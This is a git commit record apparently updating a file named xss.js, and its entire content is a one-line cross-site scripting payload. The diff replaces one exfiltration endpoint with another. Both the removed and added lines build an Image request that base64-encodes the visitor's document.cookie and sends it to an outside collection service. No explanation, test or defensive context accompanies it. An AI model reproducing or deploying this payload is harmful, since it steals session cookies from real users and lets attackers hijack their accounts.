9849dcc1eabcfe20f655a82a2ad7d40ff6047602
Mostafa Mohamed <108747701+Mustafaa8a@users.noreply.github.com>
2025-11-23 20:14:30 +0200

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/0ea228ed-446d-4474-8141-f3c3397d9a43?data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://mostafa.free.beeceptor.com?data='+btoa(document.cookie);
